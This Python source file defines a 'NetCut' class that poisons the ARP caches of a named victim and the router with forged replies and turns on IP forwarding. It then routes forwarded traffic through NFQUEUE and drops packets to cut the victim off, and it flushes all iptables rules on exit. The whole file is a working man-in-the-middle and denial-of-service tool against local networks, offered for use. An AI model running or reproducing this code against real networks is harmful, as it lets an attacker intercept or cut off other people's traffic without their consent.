from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import subprocess
from time import sleep
from queue import Queue


class NetCut:
    def __init__(self, white_ip, victim, router):
        self.white_ip = white_ip
        self.victim = victim
        self.router = router
        self.q = Queue()

    ############ ARP SPOOF ################
    def linux_iproute(self, meaning):
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path, "w") as f:
            print(meaning, file=f)

    def get_mac(self, ip):
        while True:
            try:
                arp = scapy.ARP(pdst=ip)
                broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                pkt = broadcast/arp

                ans = scapy.srp(pkt, verbose=False, timeout=1)[0]
                return ans[0][1].hwsrc
            except:
                continue

    def send_packet(self, target, target_spoof):
        target_mac = self.get_mac(target)

        arp = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=target_spoof)
        scapy.send(arp, verbose=False)

    def restore(self, target, source):
        target_mac = self.get_mac(target)
        source_mac = self.get_mac(source)

        arp = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        
        scapy.send(arp, verbose=False)
    
    def spoof(self):
        self.linux_iproute(1)
        while self.q.empty():
            self.send_packet(self.victim, self.router)
            self.send_packet(self.router, self.victim)
            sleep(2)

    ############ QUEUE ################
    def net_cut(self, packet):
        pkt = scapy.IP(packet.get_payload())

        if pkt[0].src != self.white_ip or pkt[0].dst != self.white_ip:
            packet.drop()
        else:
            packet.accept()

    def queue_run(self):
        subprocess.Popen("iptables -A FORWARD -j NFQUEUE --queue-num 2", shell=True)

        queue = NetfilterQueue()
        queue.bind(2, self.net_cut)
        try:
            queue.run()
        except KeyboardInterrupt:
            self.q.put_nowait("stop")

            self.restore(self.victim, self.router)
            self.restore(self.router, self.victim)
            
            self.linux_iproute(0)

            subprocess.Popen("iptables -F", shell=True)